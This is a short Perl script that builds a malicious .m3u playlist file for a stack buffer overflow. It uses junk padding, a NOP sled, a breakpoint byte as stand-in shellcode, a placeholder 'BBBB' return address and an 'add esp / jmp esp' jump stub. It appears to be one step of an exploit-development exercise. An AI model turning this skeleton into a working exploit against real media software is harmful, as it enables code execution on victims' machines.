my $file= "test1.m3u";
my $buffersize = 26074;

my $junk= "A" x 250;
my $nop = "\x90" x 50;
my $shellcode = "\xcc";  #position 300

my $restofbuffer = "A" x ($buffersize-(length($junk)+length($nop)+length($shellcode)));

my $eip = "BBBB";
my $preshellcode = "X" x 4;
my $jumpcode = "\x83\xc4\x5e" .   #add esp,0x5e
   "\x83\xc4\x5e" .               #add esp,0x5e
   "\x83\xc4\x5e" .               #add esp,0x5e
   "\xff\xe4";                    #jmp esp

my $nop2 = "0x90" x 10;   # only used to visually separate

my $buffer = $junk.$nop.$shellcode.$restofbuffer;

print "Size of buffer : ".length($buffer)."\n";

open($FILE,">$file");
print $FILE $buffer.$eip.$preshellcode.$jumpcode;
close($FILE);
print "m3u File Created successfully\n";
